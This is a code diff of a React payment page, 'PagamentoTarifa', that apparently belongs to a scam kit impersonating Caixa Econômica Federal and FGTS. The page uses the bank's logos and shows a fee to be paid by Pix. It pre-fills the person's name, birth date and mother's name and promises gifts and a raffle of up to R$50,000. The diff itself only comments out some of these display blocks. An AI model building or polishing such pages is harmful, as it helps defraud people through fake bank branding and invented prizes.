@@ -1,16 +1,16 @@
 import { useEffect, useState } from "react";
 import logo from "../assets/caixalogo.png";
 import logofgts from "../assets/fgts2.png";
-import caixa from "../assets/logo.png";
+// import caixa from "../assets/logo.png";
 import pix from "../assets/pix.png";
 import { IoIosWarning } from "react-icons/io";
 import { Helmet } from "react-helmet";
 import { UserData } from "../types/userData";
 import cartao from "../assets/cartao.png"
-import box from "../assets/carro.png"
+// import box from "../assets/carro.png"
 // import carrinho from "../assets/carrinho.png"
 import logocaixa from "../assets/caixalogo.png"
-import flogo from "../assets/f-logo.png"
+// import flogo from "../assets/f-logo.png"
 // import { BiDownArrowAlt } from "react-icons/bi";
 
 
@@ -131,18 +131,18 @@ export function PagamentoTarifa() {
                     <p className="text-6xl font-semibold text-green-600">R$ {displayedAmount.toFixed(2)}</p>
                 </div>
 
-                <div className="bg-primary w-full flex p-6 pb-10 flex-col items-center space-y-6">
+                {/* <div className="bg-primary w-full flex p-6 pb-10 flex-col items-center space-y-6">
                     <img width={300} src={caixa} alt="" />
-                    {/* 
+                    
                     <div className="flex items-center space-x-2 animate-bounce">
                         <BiDownArrowAlt className="text-white text-4xl" />
                         <div className="text-white text-3xl">Arraste para baixo</div>
                         <BiDownArrowAlt className="text-white text-4xl" />
-                    </div> */}
-                </div>
+                    </div>
+                </div> */}
 
-                <div className="space-y-4 w-full">
-                    {/* Nome */}
+                {/* <div className="space-y-4 w-full">
+                    
                     <div className="flex items-center space-x-2">
 
                         <input
@@ -154,7 +154,7 @@ export function PagamentoTarifa() {
                         />
                     </div>
 
-                    {/* Data de Nascimento */}
+                    
                     <div className="flex items-center space-x-2">
 
                         <input
@@ -166,7 +166,7 @@ export function PagamentoTarifa() {
                         />
                     </div>
 
-                    {/* Nome da Mãe */}
+                  
                     {userData?.nomeMae && (
                         <div className="flex items-center space-x-2">
 
@@ -179,17 +179,17 @@ export function PagamentoTarifa() {
                             />
                         </div>
                     )}
-                </div>
+                </div> */}
 
 
 
 
-                <div className="flex items-center space-x-2">
+                {/* <div className="flex items-center space-x-2">
                     <div className="bg-orange-500 p-2 rounded-full w-fit">
                         <img width={20} src={flogo} alt="" />
                     </div>
                     <h2 className="text-3xl text-zinc-700 font-semibold">+ Brindes:</h2>
-                </div>
+                </div> */}
 
                 <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
                     <img src={cartao} alt="cartao" width={120} />
@@ -207,13 +207,13 @@ export function PagamentoTarifa() {
                     </div>
                 </div> */}
 
-                <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
+                {/* <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
                     <img src={box} alt="cartao" width={130} />
                     <div className="flex flex-col justify-normal">
                         <h3 className="font-semibold  text-xl text-zinc-700">+ Sorteio <span className="text-yellow-600">Caixa Econômica</span></h3>
                         <span>Até R$50.000 em prêmios</span>
                     </div>
-                </div>
+                </div> */}
 
 
 
